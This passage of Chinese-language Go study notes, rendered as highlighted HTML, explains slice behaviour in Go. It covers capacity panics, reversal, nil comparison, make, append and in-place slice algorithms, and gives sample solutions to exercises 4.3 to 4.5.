punctuation\">(</span><span class=\"token string\">\"%s appears in both\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>字符串的切片操作和<code>[]byte</code>字节类型切片的切片操作是类似的，都写作<code>x[m:n]</code>，<code>x[m:n]</code>切片操作对于字符串则生成一个新字符串，如果x是<code>[]byte</code>的话则生成一个新的<code>[]byte</code>。</p>\n<h4>slice异常</h4>\n<p>如果切片操作超出cap(s)的上限将导致一个panic异常，但是超出len(s)则是意味着扩展了slice，因为新slice的长度会变大：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>summer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// panic: out of range</span>\n\nendlessSummer <span class=\"token operator\">:=</span> summer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">// extend a slice (within capacity)</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>endlessSummer<span class=\"token punctuation\">)</span>  <span class=\"token comment\">// \"[June July August September October]\"</span>\n</code></pre></div><h4>slice反转</h4>\n<blockquote>\n<p>slice值包含指向第一个slice元素的指针，因此向函数传递slice将允许在函数内部修改底层数组的元素。换句话说，复制一个slice只是对底层的数组创建了一个新的slice别名（§2.3.2）。</p>\n</blockquote>\n<p>下面的reverse函数在原内存空间将<code>[]int</code>类型的slice反转，而且它可以用于任意长度的slice。一种将slice元素循环向左旋转n个元素的方法是三次调用reverse反转函数如果是向右循环旋转，则将第三个函数调用移到第一个调用位置就可以了。）</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token comment\">// reverse reverses a slice of ints in place.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> j<span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\ts<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// 反转</span>\n\ta <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"[5 4 3 2 1 0]\"</span>\n\t<span class=\"token comment\">// 将slice元素循环向左旋转n个元素</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// Rotate s left by two positions.</span>\n\t<span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"[2 3 4 5 0 1]\"</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h4>slice和数组</h4>\n<p>**初始化差异：**slice和数组的字面值语法很类似，它们都是用花括弧包含一系列的初始化元素，但是slice并没有指明序列的长度，这会隐式地创建一个合适大小的数组，然后slice的指针指向底层的数组。</p>\n<p>**字面值初始化：**和数组字面值一样，slice的字面值也可以按顺序指定初始化值序列，或者是通过索引和元素值指定，或者用两种风格的混合语法初始化。</p>\n<h4>slice比较</h4>\n<p>**比较上的差异：**和数组不同的是，slice之间不能比较，不能使用==操作符来判断两个slice是否含有全部相等元素。标准库提供了<code>bytes.Equal</code>函数来判断两个<code>[]byte</code>型slice是否相等，其他类型的slice必须自己展开每个元素进行比较：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">equal</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> x <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> y<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240424220922040</figcaption></figure>\n<p>slice唯一合法的比较操作是和nil比较，例如：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>if summer == nil { /* ... */ }\n</code></pre></div><p>一个零值的slice等于nil。一个nil值的slice并没有底层数组。一个nil值的slice的长度和容量都是0，但是也有非nil值的slice的长度和容量也是0的，例如<code>[]int{}</code>或<code>make([]int, 3)[3:]</code>。与任意类型的nil值一样，我们可以用<code>[]int(nil)</code>类型转换表达式来生成一个对应类型slice的nil值。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> s <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span>    <span class=\"token comment\">// len(s) == 0, s == nil</span>\ns <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span>        <span class=\"token comment\">// len(s) == 0, s == nil</span>\ns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">int</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// len(s) == 0, s == nil</span>\ns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>    <span class=\"token comment\">// len(s) == 0, s != nil</span>\n\n</code></pre></div><p>如果你需要测试一个slice是否是空的，使用<code>len(s) == 0</code>来判断，而不应该用<code>s == nil</code>来判断。</p>\n<h4>make函数</h4>\n<p>内置的make函数创建一个指定元素类型、长度和容量的slice。容量部分可以省略，在这种情况下，容量将等于长度。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>make([]T, len)\nmake([]T, len, cap) // same as make([]T, cap)[:len]\n</code></pre></div><p>在底层，make创建了一个匿名的数组变量，然后返回一个slice；只有通过返回的slice才能引用底层匿名的数组变量。在第一种语句中，slice是整个数组的view。在第二个语句中，slice只引用了底层数组的前len个元素，但是容量将包含整个的数组。额外的元素是留给未来的增长用的。</p>\n<h3>4.2.1. append函数</h3>\n<p>内置的append函数用于向slice追加元素：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var runes []rune\nfor _, r := range \"Hello, 世界\" {\n    runes = append(runes, r)\n}\nfmt.Printf(\"%q\\n\", runes) // \"['H' 'e' 'l' 'l' 'o' ',' ' ' '世' '界']\"\n</code></pre></div><p>在循环中使用append函数构建一个由九个rune字符构成的slice，当然对应这个特殊的问题我们可以通过Go语言内置的<code>[]rune(\"Hello, 世界\")</code>转换操作完成。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">appendInt</span><span class=\"token punctuation\">(</span>x <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> y <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> z <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span>\n    zlen <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">if</span> zlen <span class=\"token operator\">&lt;=</span> <span class=\"token function\">cap</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// There is room to grow.  Extend the slice.</span>\n        z <span class=\"token operator\">=</span> x<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>zlen<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// There is insufficient space.  Allocate a new array.</span>\n        <span class=\"token comment\">// Grow by doubling, for amortized linear complexity.</span>\n        zcap <span class=\"token operator\">:=</span> zlen\n        <span class=\"token keyword\">if</span> zcap <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            zcap <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        z <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> zlen<span class=\"token punctuation\">,</span> zcap<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span> <span class=\"token comment\">// a built-in function; see text</span>\n    <span class=\"token punctuation\">}</span>\n    z<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> y\n    <span class=\"token keyword\">return</span> z\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>每次调用appendInt函数，必须先检测slice底层数组是否有足够的容量来保存新添加的元素。如果有足够空间的话，直接扩展slice（依然在原有的底层数组之上），将新添加的y元素复制到新扩展的空间，并返回slice。因此，输入的x和输出的z共享相同的底层数组。如果没有足够的增长空间的话，appendInt函数则会先分配一个足够大的slice用于保存新的结果，先将输入的x复制到新的空间，然后添加y元素。结果z和输入的x引用的将是不同的底层数组。</p>\n<figure><figcaption>image-20240425175118604</figcaption></figure>\n<p>内置的append函数可能使用比appendInt更复杂的内存扩展策略，并不知道append调用是否导致了内存的重新分配，也不能确认在原先的slice上的操作是否会影响到新的slice。通常是将append返回的结果直接赋值给输入的slice变量：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>runes <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>runes<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span>\n</code></pre></div><p>更新slice变量不仅对调用append函数是必要的，实际上对应任何可能导致长度、容量或底层数组变化的操作都是必要的。要正确地使用slice，需要记住尽管底层数组的元素是间接访问的，但是slice对应结构体本身的指针、长度和容量部分是直接访问的。要更新这些信息需要像上面例子那样一个显式的赋值操作。从这个角度看，slice并不是一个纯粹的引用类型，它实际上是一个类似下面结构体的聚合类型：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> IntSlice <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n    ptr      <span class=\"token operator\">*</span><span class=\"token builtin\">int</span>\n    <span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">cap</span> <span class=\"token builtin\">int</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>置的append函数可以追加多个元素，甚至追加一个slice：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">var</span> x <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span>\nx <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> x<span class=\"token operator\">...</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// append the slice x</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>      <span class=\"token comment\">// \"[1 2 3 4 5 6 1 2 3 4 5 6]\"</span>\n\n</code></pre></div><h3>4.2.2. Slice内存技巧</h3>\n<p>给定一个字符串列表，下面的nonempty函数将在原有slice内存空间之上返回不包含空字符串的列表：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Nonempty is an example of an in-place slice algorithm.</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"fmt\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">nonempty</span><span class=\"token punctuation\">(</span>strings <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\ti <span class=\"token operator\">:=</span> <span class=\"token number\">0</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> s <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strings <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> s <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">{</span>\n\t\t\tstrings<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s\n\t\t\ti<span class=\"token operator\">++</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> strings<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>输入的slice和输出的slice共享一个底层数组。这可以避免分配另一个数组，不过原来的数据将可能会被覆盖，正如下面两个打印语句看到的那样：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>data <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"one\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"three\"</span><span class=\"token punctuation\">}</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%q\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">nonempty</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// [\"one\" \"three\"]</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%q\\n\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>           <span class=\"token comment\">// [\"one\" \"three\" \"three\"]</span>\n</code></pre></div><p>因此我们通常会这样使用nonempty函数：<code>data = nonempty(data)</code>。</p>\n<p>nonempty函数也可以使用append函数实现：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">nonempty2</span><span class=\"token punctuation\">(</span>strings <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// NOTE: strings[:0]表示一个原始数组strings的切片，但切片长度是0，容量是数组的cap</span>\n\tout <span class=\"token operator\">:=</span> strings<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">// zero-length slice of original</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> s <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strings <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> s <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">{</span>\n\t\t\tout <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> out\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>一个slice可以用来模拟一个stack。最初给定的空slice对应一个空的stack，然后可以使用append函数将新的值压入stack：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>stack = append(stack, v) // push v\n</code></pre></div><p>stack的顶部位置对应slice的最后一个元素：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>top := stack[len(stack)-1] // top of stack\n</code></pre></div><p>通过收缩stack可以弹出栈顶的元素</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>stack = stack[:len(stack)-1] // pop\n</code></pre></div><p>要删除slice中间的某个元素并保存原有的元素顺序，可以通过内置的copy函数将后面的子slice向前依次移动一位完成：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func remove(slice []int, i int) []int {\n    copy(slice[i:], slice[i+1:])\n    return slice[:len(slice)-1]\n}\n\nfunc main() {\n    s := []int{5, 6, 7, 8, 9}\n    fmt.Println(remove(s, 2)) // \"[5 6 8 9]\"\n}\n</code></pre></div><p>如果删除元素后不用保持原来顺序的话，我们可以简单的用最后一个元素覆盖被删除的元素：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func remove(slice []int, i int) []int {\n    slice[i] = slice[len(slice)-1]\n    return slice[:len(slice)-1]\n}\n\nfunc main() {\n    s := []int{5, 6, 7, 8, 9}\n    fmt.Println(remove(s, 2)) // \"[5 6 9 8]\n}\n</code></pre></div><h3>练习 4.3</h3>\n<p>重写reverse函数，使用数组指针代替slice。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ta <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>s <span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> j<span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> j<span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n\t\ts<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 4.4</h3>\n<p>编写一个rotate函数，通过一次循环完成旋转。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span>s <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> rotateTimes <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">//var result []int</span>\n\tresult <span class=\"token operator\">:=</span> s\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> rotateTimes<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\tresult <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n\t\tresult <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token comment\">//s = result</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 4.5</h3>\n<p>写一个函数在原地完成消除[]string中相邻重复的字符串的操作。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\ts <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"i\"</span><span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token 